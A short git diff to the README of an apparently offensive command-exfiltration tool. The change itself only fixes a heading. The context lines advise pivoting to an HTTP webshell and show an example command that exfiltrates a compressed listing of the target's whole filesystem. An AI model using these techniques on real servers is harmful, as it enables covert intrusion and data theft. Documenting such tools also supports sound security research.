@@ -88,7 +88,7 @@ while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(d
 [2] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
 A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
 
-###Tips
+### Tips
 
  - You probably want to use this script as little as possible, try to transition to a higher bandwidth channel the soonest possible (e.g. HTTP-webshell)
  - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(gzip -d) -- 'ls -lhR / | gzip'
